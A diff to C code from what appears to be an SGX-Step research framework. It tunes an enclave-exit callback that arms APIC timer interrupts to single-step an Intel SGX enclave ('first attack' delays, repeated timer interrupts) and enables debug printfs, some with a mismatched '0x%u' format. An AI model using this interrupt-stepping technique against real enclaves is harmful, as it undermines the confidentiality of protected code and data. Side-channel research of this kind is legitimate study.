@@ -155,34 +155,38 @@ void attacker_config_runtime(void)
 int __sgx_step_app_terminated = 1; // if the app stops (either normal termination and seg fault)
 
 /* Called before resuming the enclave after an Asynchronous Enclave eXit. haohua */
-#define SGX_STEP_TIMER_INTERVAL 42
+#define SGX_STEP_TIMER_INTERVAL 41
 long unsigned SGX_STEP_FIRST_ATTACK_VAL = 0; 
 long unsigned SGX_STEP_FIRST_ATTACK_RANGE = 0; 
 
 unsigned long long __aex_count = 0; 
 int __attacked = 0; 
 
+extern int __sgx_step_app_terminated; 
+
 void aep_cb_func(void)
 {
     // printf("[[ SGX-STEP ]] sgxstep-first-attack-val = %lu, sgxstep-first-attack-range = %lu\n", SGX_STEP_FIRST_ATTACK_VAL, SGX_STEP_FIRST_ATTACK_RANGE); 
+    
 
     gprsgx_region_t grpsgx; 
     edbgrd(get_enclave_ssa_gprsgx_adrs(), &grpsgx, sizeof(gprsgx_region_t));  
+    // printf("[[ SGX-STEP ]]: ssa reseved = 0x%x\n", grpsgx.fields.reserved == 0xfff);
 
     if (grpsgx.fields.reserved == 0x0 || grpsgx.fields.reserved == 0xfff){
         //if (grpsgx.fields.reserved == 0xfff) printf("[[ SGX-STEP ]]: {{ STOP }}\n");
 	    return; 
     }
     else if (__attacked == 0 && grpsgx.fields.reserved == 0xAB11 && apic_read(APIC_TMICT) == 0 && grpsgx.fields.r11 == 0xDE7){ // NOTE: (1) make sure only set it once !  (2) r11 with a special value is also ok. 
-	    //printf("[[ SGX-STEP ]]:|| {{ FIRST ATTACK  }} || RIP = 0x%lx || ssa.reserved = 0x%x || APIC_TMICT = 0x%x || APIC_TMCCT = 0x%x \n", grpsgx.fields.rip, grpsgx.fields.reserved, apic_read(APIC_TMICT), apic_read(APIC_TMCCT)); 
+	    printf("[[ SGX-STEP ]]:|| {{ FIRST ATTACK  }} || RIP = 0x%lx || ssa.reserved = 0x%x || APIC_TMICT = 0x%u || APIC_TMCCT = 0x%u \n", grpsgx.fields.rip, grpsgx.fields.reserved, apic_read(APIC_TMICT), apic_read(APIC_TMCCT)); 
 	    __attacked = 1;
 	    srand(time(NULL)); 
 	    unsigned attack_delay = SGX_STEP_FIRST_ATTACK_VAL + rand() % SGX_STEP_FIRST_ATTACK_RANGE; 
 	    printf("[[ SGX-STEP ]]: attack dealy = %u\n", attack_delay); 
 	    apic_timer_irq(attack_delay); 
     }
-    else if (__attacked == 1 && apic_read(APIC_TMICT) != 0 && apic_read(APIC_TMCCT) == 0){
-            //printf("[[ SGX-STEP ]]:|| {{ CONTINUE }} RIP = 0x%lx || ssa.reserved = 0x%x || APIC_TMICT = 0x%x || APIC_TMCCT = 0x%x \n", grpsgx.fields.rip, grpsgx.fields.reserved, apic_read(APIC_TMICT), apic_read(APIC_TMCCT)); 
+    else if (__attacked == 1 && apic_read(APIC_TMICT) != 0){
+        printf("[[ SGX-STEP ]]:|| {{ CONTINUE }} RIP = 0x%lx || ssa.reserved = 0x%x || APIC_TMICT = 0x%u || APIC_TMCCT = 0x%u \n", grpsgx.fields.rip, grpsgx.fields.reserved, apic_read(APIC_TMICT), apic_read(APIC_TMCCT)); 
 	    __aex_count++;
 	    apic_timer_irq(SGX_STEP_TIMER_INTERVAL);  	
     }
